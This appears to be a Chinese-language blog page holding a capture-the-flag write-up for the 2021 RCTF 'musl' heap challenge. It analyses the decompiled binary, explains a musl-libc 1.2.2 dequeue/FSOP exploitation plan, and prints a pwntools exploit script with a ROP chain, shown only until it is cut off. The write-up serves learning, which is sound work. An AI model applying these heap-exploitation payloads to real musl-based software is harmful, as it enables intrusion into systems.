@@ -1,0 +1,546 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0.ico">
+  <link rel="icon" href="/img/0.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sh0ve1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x0 前言利用2021RCTF的musl学习一下musl-libc的利用技巧。在阅读之前建议根据文末的参考资料了解一下musl-libc的基本知识。题目musl采用的是musl-libc 1.2.2 0x1 功能分析 add（漏洞点）: 先申请一个size&#x3D;0xc的控制堆块chunk1，将chunk1放到全局指针数组ptr中，然后再根据用户输入的大小申请内容堆块chunk2，并将chu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021RCTF-musl">
+<meta property="og:url" content="https://sh0ve1.github.io/2021/10/02/2021RCTF-musl/index.html">
+<meta property="og:site_name" content="sh0ve1&#39;s blog">
+<meta property="og:description" content="0x0 前言利用2021RCTF的musl学习一下musl-libc的利用技巧。在阅读之前建议根据文末的参考资料了解一下musl-libc的基本知识。题目musl采用的是musl-libc 1.2.2 0x1 功能分析 add（漏洞点）: 先申请一个size&#x3D;0xc的控制堆块chunk1，将chunk1放到全局指针数组ptr中，然后再根据用户输入的大小申请内容堆块chunk2，并将chu">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-10-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-17T09:53:09.294Z">
+<meta property="article:author" content="sh0ve1">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="musl-libc">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  <title>2021RCTF-musl - sh0ve1&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"sh0ve1.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"pU0JQUaRtEv6Lgu0jxYpEBT9-gzGzoHsz","app_key":"2Gdcl19Uu0nQBNMs6fu6YiR4","server_url":"https://pu0jquar.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh0ve1&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/1.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2021RCTF-musl">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-02 00:00" pubdate>
+        2021年10月2日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      8.8k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      74 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2021RCTF-musl</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>利用<code>2021RCTF</code>的<code>musl</code>学习一下<code>musl-libc</code>的利用技巧。在阅读之前建议根据文末的参考资料了解一下<code>musl-libc</code>的基本知识。<br>题目musl采用的是<code>musl-libc 1.2.2</code></p>
+<h2 id="0x1-功能分析"><a href="#0x1-功能分析" class="headerlink" title="0x1 功能分析"></a>0x1 功能分析</h2><ul>
+<li><p>add（漏洞点）: 先申请一个size&#x3D;0xc的控制堆块chunk1，将chunk1放到全局指针数组ptr中，然后再根据用户输入的大小申请内容堆块chunk2，并将chunk2的地址存放在chunk1的前8字节，chunk2的大小减一存放在chunk1的剩余4字节。之后再根据chunk1的地址和大小进行输入内容。</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  idx = <span class="hljs-built_in">readint</span>();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">15</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  v3 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xC</span>uLL);<br>  <span class="hljs-keyword">if</span> ( !v3 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  ptr[idx] = v3;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size?&quot;</span>);<br>  size = <span class="hljs-built_in">readint</span>();<br>  *(_QWORD *)v3 = <span class="hljs-built_in">malloc</span>(size);<br>  v3[<span class="hljs-number">2</span>] = size - <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Contnet?&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">readn</span>(*(_QWORD *)v3, v3[<span class="hljs-number">2</span>]);           <span class="hljs-comment">// overflow 整数溢出 0-1=-1</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>show：根据idx在ptr中确定chunk1的地址，然后从chunk1中取出chunk2的地址和内容大小，然后利用地址输出内容</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  idx = <span class="hljs-built_in">readint</span>();<br>  <span class="hljs-keyword">if</span> ( idx &gt;= <span class="hljs-number">0</span> &amp;&amp; idx &lt;= <span class="hljs-number">15</span> &amp;&amp; (v2 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)ptr[idx]) != <span class="hljs-number">0LL</span> &amp;&amp; <span class="hljs-built_in">strlen</span>(*v2) &lt;= *((<span class="hljs-type">int</span> *)v2 + <span class="hljs-number">2</span>) )<span class="hljs-comment">// 0&lt;=idx&lt;=15,内容长度小于等于size，对应堆数组值不为0</span><br>    result = <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content: %s\n&quot;</span>, *v2);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li><p>delete：根据idx在ptr中确定chunk1的地址，然后从chunk1中取出chunk2的地址,然后依次释放chunk2和chunk1，并都置为0。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> **ptr; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  idx = <span class="hljs-built_in">readint</span>();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">15</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  ptr = (<span class="hljs-type">void</span> **)::ptr[idx];<br>  <span class="hljs-keyword">if</span> ( !*ptr )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>  <span class="hljs-built_in">free</span>(*ptr);<br>  <span class="hljs-built_in">free</span>(ptr);<br>  ::ptr[idx] = <span class="hljs-number">0LL</span>;<br>  *ptr = <span class="hljs-number">0LL</span>;<br>  *((_DWORD *)ptr + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ol>
+<li>由于申请一个group的chunk时优先选取新的可用chunk，而不是刚free的chunk，所以我没需要先把该group中的所有chunk申请了;</li>
+<li>为了泄露地址，我们需要连续申请多个自定义size&#x3D;0xc的chunk，这样就可以删除其中一个chunk,然后再申请它，此时进行溢出，填充非<code>\x00</code>字节直到下一个chunk的控制堆块，从而可以使用<code>show</code>泄露出下一个chunk的内容堆块的地址；</li>
+<li>利用上述方法泄露出<code>heap_addr</code>和<code>__malloc_context</code>，前者可以用来确定libc基址，后者可以用于伪造meta，从而触发<code>dequeue函数</code>（类似glibc的<code>unlink</code>），将指针<code>ofl_head</code>(类似glibc的<code>__IO_list_all</code>)的值改为伪造的文件流</li>
+<li>在伪造的文件流中设置<code>magic_gadget</code>,进行栈迁移到ROP链的地址处，进行ORW;</li>
+<li>执行<code>exit</code>从而执行<code>__stdio_exit</code>函数和<code>close_file(FILE *f)</code>，从而执行<code>magic_gadget</code>和ORW，获取flag。</li>
+</ol>
+<h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :dequeue（musl-libc 1.2.2） + 堆溢出 + 整数溢出 + FSOP</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string"></span><br><span class="hljs-string">seccomp-tools dump ./musl </span><br><span class="hljs-string"> line  CODE  JT   JF      K</span><br><span class="hljs-string">=================================</span><br><span class="hljs-string"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="hljs-string"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="hljs-string"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="hljs-string"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="hljs-string"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="hljs-string"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="hljs-string"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = process([<span class="hljs-string">&#x27;./libc.so&#x27;</span>,<span class="hljs-string">&#x27;./musl&#x27;</span>])<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;idx?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    p.sendlineafter(<span class="hljs-string">&quot;size?&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&quot;Contnet?&quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;idx?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;idx?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment"># 因为申请该group的chunk时优先选取新的可用chunk，而不是free的chunk</span><br><span class="hljs-comment"># 该group可以有30个，必须要先全部申请了</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    add(i,<span class="hljs-number">0xC</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0xB</span>) <span class="hljs-comment"># 一次就是2个</span><br><br>log.info(<span class="hljs-string">&quot;leak libc &amp; leak heap&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0xf</span>) <span class="hljs-comment"># 使用的就是free的chunk &#x27;\n&#x27;占1Byte，所以只需输入0xf</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;BB\n&quot;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address =  heap_addr - <span class="hljs-number">0x298d50</span><br>__malloc_context = libc.sym[<span class="hljs-string">&quot;__malloc_context&quot;</span>]<br>log.success(<span class="hljs-string">&quot;heap_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_addr))<br>log.success(<span class="hljs-string">&quot;__malloc_context: &quot;</span> + <span class="hljs-built_in">hex</span>(__malloc_context))<br>log.success(<span class="hljs-string">&quot;libcbase: &quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))<br><br>log.info(<span class="hljs-string">&quot;leak check&quot;</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x10</span> + p64(__malloc_context)) <span class="hljs-comment"># 修改idx=3的 控制chunk 中的 内容chunk 指针为 __malloc_context,即可控制ctx</span><br>show(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>check = u64(p.recv(<span class="hljs-number">8</span>))<br>log.success(<span class="hljs-string">&quot;check: &quot;</span> + <span class="hljs-built_in">hex</span>(check))<br><br><span class="hljs-comment"># gadgets</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">magic_gadget:</span><br><span class="hljs-string">0x7ffff7db05ae &lt;longjmp+30&gt;:	mov    rsp,QWORD PTR [rdi+0x30]</span><br><span class="hljs-string">0x7ffff7db05b2 &lt;longjmp+34&gt;:	jmp    QWORD PTR [rdi+0x38]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>magic_gadget = libc.address + <span class="hljs-number">0x4a5ae</span><br>ret = libc.address + <span class="hljs-number">0x598</span><br>pop_rax_ret = libc.address + <span class="hljs-number">0x1b8fd</span><br>pop_rdi_ret = libc.address + <span class="hljs-number">0x14b82</span><br>pop_rdx_ret = libc.address + <span class="hljs-number">0x9328</span><br>pop_rsi_ret = libc.address + <span class="hljs-number">0x1b27a</span><br>syscall = libc.address + <span class="hljs-number">0x1d14</span><br>syscall_ret = libc.address + <span class="hljs-number">0x23711</span><br><br>sc = <span class="hljs-number">0</span><br>freeable = <span class="hljs-number">1</span><br>last_idx = <span class="hljs-number">0</span><br>maplen = <span class="hljs-number">0</span><br>ofl_head_addr = libc.address + <span class="hljs-number">0x297E68</span> <br>fake_mem_addr = heap_addr + <span class="hljs-number">0xF0</span> - <span class="hljs-number">0x50</span><br><br>log.info(<span class="hljs-string">&quot;write ORW &amp; fake meta &amp; fake meta_area to Mem&quot;</span>)<br>orw = <span class="hljs-string">b&#x27;D&#x27;</span>*<span class="hljs-number">0x300</span><br><span class="hljs-comment"># fd = open(flag_addr,0) = 3</span><br>orw += p64(pop_rdi_ret)<br>orw += p64(heap_addr + <span class="hljs-number">0x60</span>) <span class="hljs-comment"># &quot;./flag&quot;的地址 因为是后面才写入该字符串，所以后面才能确定</span><br>orw += p64(pop_rsi_ret)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>])<br><span class="hljs-comment"># read(fd,buf,0x1000)</span><br>orw += p64(pop_rdi_ret)<br>orw += p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi_ret)<br>orw += p64(heap_addr + <span class="hljs-number">0x100</span>) <span class="hljs-comment"># heap_addr + 0x1b0 &lt; the address &lt;heap_addr + 0x12b0 就不能输出??</span><br>orw += p64(pop_rdx_ret)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(libc.sym[<span class="hljs-string">&quot;read&quot;</span>])<br><span class="hljs-comment"># write(1,buf,0x1000)</span><br>orw += p64(pop_rdi_ret)<br>orw += p64(<span class="hljs-number">1</span>)<br>orw += p64(pop_rsi_ret)<br>orw += p64(heap_addr + <span class="hljs-number">0x100</span>)<br>orw += p64(pop_rdx_ret)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(libc.sym[<span class="hljs-string">&quot;write&quot;</span>])<br><br>payload1 = orw<br>payload1 = payload1.ljust(<span class="hljs-number">0x1000</span>-<span class="hljs-number">0x20</span>,<span 